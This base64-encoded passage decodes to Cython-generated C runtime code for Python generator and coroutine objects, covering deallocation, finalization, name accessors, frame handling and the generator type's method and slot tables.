pOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9tb2R1bGVuYW1lKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9kZWFsbG9jKFB5T2JqZWN0ICpzZWxmKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soZ2VuKTsKICAgIGlmIChnZW4tPmdpX3dlYWtyZWZsaXN0ICE9IE5VTEwpCiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcyhzZWxmKTsKICAgIGlmIChnZW4tPnJlc3VtZV9sYWJlbCA+PSAwKSB7CiAgICAgICAgUHlPYmplY3RfR0NfVHJhY2soc2VsZik7CiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgICAgICAgaWYgKHVubGlrZWx5KFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhzZWxmKSkpCiNlbHNlCiAgICAgICAgewogICAgICAgICAgICBkZXN0cnVjdG9yIGRlbCA9IF9fUHl4X1B5T2JqZWN0X0dldFNsb3QoZ2VuLCB0cF9kZWwsIGRlc3RydWN0b3IpOwogICAgICAgICAgICBpZiAoZGVsKSBkZWwoc2VsZik7CiAgICAgICAgfQogICAgICAgIGlmICh1bmxpa2VseShQeV9SRUZDTlQoc2VsZikgPiAwKSkKI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7CiAgICB9CiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgIAogICAgICAgIFB5X0NMRUFSKCgoX19weXhfUHlBc3luY0dlbk9iamVjdCopc2VsZiktPmFnX2ZpbmFsaXplcik7CiAgICB9CiNlbmRpZgogICAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKHNlbGYpOwogICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwoZ2VuKTsKfQojaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQpzdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfZGVsKFB5T2JqZWN0ICpzZWxmKSB7CiAgICBQeU9iamVjdCAqZXJyb3JfdHlwZSwgKmVycm9yX3ZhbHVlLCAqZXJyb3JfdHJhY2ViYWNrOwogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIGlmIChnZW4tPnJlc3VtZV9sYWJlbCA8IDApIHsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXJyRmV0Y2goJmVycm9yX3R5cGUsICZlcnJvcl92YWx1ZSwgJmVycm9yX3RyYWNlYmFjayk7CiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgIF9fcHl4X1B5QXN5bmNHZW5PYmplY3QgKmFnZW4gPSAoX19weXhfUHlBc3luY0dlbk9iamVjdCopc2VsZjsKICAgICAgICBQeU9iamVjdCAqZmluYWxpemVyID0gYWdlbi0+YWdfZmluYWxpemVyOwogICAgICAgIGlmIChmaW5hbGl6ZXIgJiYgIWFnZW4tPmFnX2Nsb3NlZCkgewogICAgICAgICAgICBQeU9iamVjdCAqcmVzID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhmaW5hbGl6ZXIsIHNlbGYpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXJlcykpIHsKICAgICAgICAgICAgICAgIFB5RXJyX1dyaXRlVW5yYWlzYWJsZShzZWxmKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICB9CiNlbmRpZgogICAgaWYgKHVubGlrZWx5KGdlbi0+cmVzdW1lX2xhYmVsID09IDAgJiYgIWVycm9yX3ZhbHVlKSkgewojaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICBpZiAoIV9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHNlbGYpKQojZW5kaWYKICAgICAgICB7CiAgICAgICAgUHlPYmplY3RfR0NfVW5UcmFjayhzZWxmKTsKICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfV2FybkZvcm1hdChQeUV4Y19SdW50aW1lV2FybmluZywgMSwgImNvcm91dGluZSAnJS41MFMnIHdhcyBuZXZlciBhd2FpdGVkIiwgZ2VuLT5naV9xdWFsbmFtZSkgPCAwKSkKICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpOwogICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKHNlbGYpOwogICAgICAgIH0KI2VuZGlmCiAgICB9IGVsc2UgewogICAgICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2Uoc2VsZiwgJnJldHZhbCk7CiAgICAgICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikgewogICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfWERFQ1JFRihyZXR2YWwpOwogICAgICAgIH0KICAgIH0KICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7Cn0KI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0Nvcm91dGluZV9nZXRfbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfbmFtZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KCFuYW1lKSkgbmFtZSA9IFB5X05vbmU7CiAgICBQeV9JTkNSRUYobmFtZSk7CiAgICByZXR1cm4gbmFtZTsKfQpzdGF0aWMgaW50Cl9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX25hbWUsIHZhbHVlKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0Nvcm91dGluZV9nZXRfcXVhbG5hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCB2b2lkICpjb250ZXh0KQp7CiAgICBQeU9iamVjdCAqbmFtZSA9IHNlbGYtPmdpX3F1YWxuYW1lOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTsKICAgIFB5X0lOQ1JFRihuYW1lKTsKICAgIHJldHVybiBuYW1lOwp9CnN0YXRpYyBpbnQKX19QeXhfQ29yb3V0aW5lX3NldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiX19xdWFsbmFtZV9fIG11c3QgYmUgc2V0IHRvIGEgc3RyaW5nIG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChzZWxmLT5naV9xdWFsbmFtZSwgdmFsdWUpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmKQp7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKmZyYW1lOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oc2VsZik7CiAgICAjZW5kaWYKICAgIGZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7CiAgICBpZiAoIWZyYW1lKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmLT5naV9jb2RlKSkgewogICAgICAgICAgICBQeV9SRVRVUk5fTk9ORTsKICAgICAgICB9CiAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFnbG9iYWxzKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgZnJhbWUgPSAoUHlPYmplY3QgKikgUHlGcmFtZV9OZXcoCiAgICAgICAgICAgIFB5VGhyZWFkU3RhdGVfR2V0KCksICAgICAgICAgICAgCiAgICAgICAgICAgIChQeUNvZGVPYmplY3QqKSBzZWxmLT5naV9jb2RlLCAgCiAgICAgICAgICAgIGdsb2JhbHMsICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgKTsKICAgICAgICBQeV9ERUNSRUYoZ2xvYmFscyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFmcmFtZSkpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIGlmICh1bmxpa2VseShzZWxmLT5naV9mcmFtZSkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKGZyYW1lKTsKICAgICAgICAgICAgZnJhbWUgPSBzZWxmLT5naV9mcmFtZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBzZWxmLT5naV9mcmFtZSA9IGZyYW1lOwogICAgICAgIH0KICAgIH0KICAgIFB5X0lOQ1JFRihmcmFtZSk7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgICNlbmRpZgogICAgcmV0dXJuIGZyYW1lOwojZWxzZQogICAgQ1lUSE9OX1VOVVNFRF9WQVIoc2VsZik7CiAgICBQeV9SRVRVUk5fTk9ORTsKI2VuZGlmCn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ29yb3V0aW5lX2dldF9mcmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKmZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7CiAgICBpZiAoZnJhbWUpCiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmcmFtZSk7CiAgICByZXR1cm4gX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoc2VsZik7Cn0Kc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoCiAgICAgICAgICAgIFB5VHlwZU9iamVjdCogdHlwZSwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSkgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBQeU9iamVjdF9HQ19OZXcoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB0eXBlKTsKICAgIGlmICh1bmxpa2VseSghZ2VuKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoZ2VuLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpOwp9CnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdCgKICAgICAgICAgICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpIHsKICAgIGdlbi0+Ym9keSA9IGJvZHk7CiAgICBnZW4tPmNsb3N1cmUgPSBjbG9zdXJlOwogICAgUHlfWElOQ1JFRihjbG9zdXJlKTsKICAgIGdlbi0+aXNfcnVubmluZyA9IDA7CiAgICBnZW4tPnJlc3VtZV9sYWJlbCA9IDA7CiAgICBnZW4tPmNsYXNzb2JqID0gTlVMTDsKICAgIGdlbi0+eWllbGRmcm9tID0gTlVMTDsKICAgIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQgPSBOVUxMOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSA9IE5VTEw7CiAgICAjZWxzZQogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3R5cGUgPSBOVUxMOwogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDsKICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMOwogICAgI2VuZGlmCiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5wcmV2aW91c19pdGVtID0gTlVMTDsKI2VuZGlmCiAgICBnZW4tPmdpX3dlYWtyZWZsaXN0ID0gTlVMTDsKICAgIFB5X1hJTkNSRUYocXVhbG5hbWUpOwogICAgZ2VuLT5naV9xdWFsbmFtZSA9IHF1YWxuYW1lOwogICAgUHlfWElOQ1JFRihuYW1lKTsKICAgIGdlbi0+Z2lfbmFtZSA9IG5hbWU7CiAgICBQeV9YSU5DUkVGKG1vZHVsZV9uYW1lKTsKICAgIGdlbi0+Z2lfbW9kdWxlbmFtZSA9IG1vZHVsZV9uYW1lOwogICAgUHlfWElOQ1JFRihjb2RlKTsKICAgIGdlbi0+Z2lfY29kZSA9IGNvZGU7CiAgICBnZW4tPmdpX2ZyYW1lID0gTlVMTDsKICAgIFB5T2JqZWN0X0dDX1RyYWNrKGdlbik7CiAgICByZXR1cm4gZ2VuOwp9CnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikgewogICAgY2hhciByZXN1bHQ7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pOwogICAgI2VuZGlmCiAgICByZXN1bHQgPSBnZW4tPmlzX3J1bm5pbmc7CiAgICBnZW4tPmlzX3J1bm5pbmcgPSAxOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7CiAgICAjZW5kaWYKICAgIGFzc2VydChnZW4tPmlzX3J1bm5pbmcpOwogICAgZ2VuLT5pc19ydW5uaW5nID0gMDsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgI2VuZGlmCn0Kc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7CiAgICBjaGFyIHJlc3VsdDsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7CiAgICAjZW5kaWYKICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZzsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlcihQeU9iamVjdCAqZ2VuLCB2b2lkICpjbG9zdXJlKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjbG9zdXJlKTsKICAgIGNoYXIgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKWdlbik7CiAgICBpZiAocmVzdWx0KSBQeV9SRVRVUk5fVFJVRTsKICAgIGVsc2UgUHlfUkVUVVJOX0ZBTFNFOwp9CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKSB7CiAgICBQeV9zc2l6ZV90IHB0cl9vZmZzZXQgPSAoY2hhciopKHR5cGUtPnRwX2FzX2FzeW5jKSAtIChjaGFyKil0eXBlOwogICAgaWYgKHB0cl9vZmZzZXQgPCAwIHx8IHB0cl9vZmZzZXQgPiB0eXBlLT50cF9iYXNpY3NpemUpIHsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBtZW1jcHkoKHZvaWQqKXN0YXRpY19hbXNlbmRfbWV0aG9kcywgKHZvaWQqKSh0eXBlLT50cF9hc19hc3luYyksIHNpemVvZigqdHlwZS0+dHBfYXNfYXN5bmMpKTsKICAgIHN0YXRpY19hbXNlbmRfbWV0aG9kcy0+YW1fc2VuZCA9IGFtX3NlbmQ7CiAgICB0eXBlLT50cF9hc19hc3luYyA9IF9fUHl4X1Nsb3RUcEFzQXN5bmMoc3RhdGljX2Ftc2VuZF9tZXRob2RzKTsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7CiAgICBfX1B5eF9UeXBlTmFtZSBzZWxmX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRSgoUHlPYmplY3QqKXNlbGYpKTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsICJjYW5ub3QgcGlja2xlICciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBvYmplY3QiLAogICAgICAgICAgICAgICAgICAgICAgICAgc2VsZl90eXBlX25hbWUpOwogICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHNlbGZfdHlwZV9uYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CgoKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0dlbmVyYXRvcl9tZXRob2RzW10gPSB7CiAgICB7InNlbmQiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9TZW5kLCBNRVRIX08sCiAgICAgUHlEb2NfU1RSKCJzZW5kKGFyZykgLT4gc2VuZCAnYXJnJyBpbnRvIGdlbmVyYXRvcixcbnJldHVybiBuZXh0IHlpZWxkZWQgdmFsdWUgb3IgcmFpc2UgU3RvcEl0ZXJhdGlvbi4iKX0sCiAgICB7InRocm93IiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfVGhyb3csIE1FVEhfVkFSQVJHUywKICAgICBQeURvY19TVFIoInRocm93KHR5cFssdmFsWyx0Yl1dKSAtPiByYWlzZSBleGNlcHRpb24gaW4gZ2VuZXJhdG9yLFxucmV0dXJuIG5leHQgeWllbGRlZCB2YWx1ZSBvciByYWlzZSBTdG9wSXRlcmF0aW9uLiIpfSwKICAgIHsiY2xvc2UiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9DbG9zZV9NZXRob2QsIE1FVEhfTk9BUkdTLAogICAgIFB5RG9jX1NUUigiY2xvc2UoKSAtPiByYWlzZSBHZW5lcmF0b3JFeGl0IGluc2lkZSBnZW5lcmF0b3IuIil9LAogICAgeyJfX3JlZHVjZV9leF9fIiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgsIE1FVEhfTywgMH0sCiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leCwgTUVUSF9OT0FSR1MsIDB9LAogICAgezAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeU1lbWJlckRlZiBfX3B5eF9HZW5lcmF0b3JfbWVtYmVybGlzdFtdID0gewogICAgeyJnaV95aWVsZGZyb20iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB5aWVsZGZyb20pLCBSRUFET05MWSwKICAgICBQeURvY19TVFIoIm9iamVjdCBiZWluZyBpdGVyYXRlZCBieSAneWllbGQgZnJvbScsIG9yIE5vbmUiKX0sCiAgICB7ImdpX2NvZGUiLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9jb2RlKSwgUkVBRE9OTFksIE5VTEx9LAogICAgeyJfX21vZHVsZV9fIiwgVF9PQkpFQ1QsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfbW9kdWxlbmFtZSksIDAsIDB9LAogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LAogICAgezAsIDAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9HZW5lcmF0b3JfZ2V0c2V0c1tdID0gewogICAgeyJfX25hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ29yb3V0aW5lX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZSwKICAgICBQeURvY19TVFIoIm5hbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSwKICAgIHsiX19xdWFsbmFtZV9fIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfcXVhbG5hbWUsCiAgICAgUHlEb2NfU1RSKCJxdWFsaWZpZWQgbmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LAogICAgeyJnaV9mcmFtZSIsIChnZXR0ZXIpX19QeXhfQ29yb3V0aW5lX2dldF9mcmFtZSwgTlVMTCwKICAgICBQeURvY19TVFIoIkZyYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sCiAgICB7ImdpX3J1bm5pbmciLCBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyLCBOVUxMLCBOVUxMLCBOVUxMfSwKICAgIHswLCAwLCAwLCAwLCAwfQp9OwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfR2VuZXJhdG9yVHlwZV9zbG90c1tdID0gewogICAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX2RlYWxsb2N9LAogICAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZX0sCiAgICB7UHlfdHBfaXRlciwgKHZvaWQgKilQeU9iamVjdF9TZWxmSXRlcn0sCiAgICB7UHlfdHBfaXRlcm5leHQsICh2b2lkICopX19QeXhfR2VuZXJhdG9yX05leHR9LAogICAge1B5X3RwX21ldGhvZHMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21ldGhvZHN9LAogICAge1B5X3RwX21lbWJlcnMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21lbWJlcmxpc3R9LAogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfZ2V0c2V0c30sCiAgICB7UHlfdHBfZ2V0YXR0cm8sICh2b2lkICopIFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyfSwKI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgIHtQeV90cF9maW5hbGl6ZSwgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfZGVsfSwKI2VuZGlmCiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAxCiAgICB7UHlfYW1fc2VuZCwgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfQW1TZW5kfSwKI2VuZGlmCiAgICB7MCwgMH0sCn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMgPSB7CiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggImdlbmVyYXRvciIsCiAgICBzaXplb2YoX19weXhfQ29yb3V0aW5lT2JqZWN0KSwKICAgIDAsCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwCiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfAojZW5kaWYKICAgIFB5X1RQRkxBR1NfREVGQVVMVCB8IFB5X1RQRkxBR1NfSEFWRV9HQyB8IFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSB8IF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5ELAogICAgX19weXhfR2VuZXJhdG9yVHlwZV9zbG90cwp9OwojaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMgpzdGF0aWMgX19QeXhfUHlBc3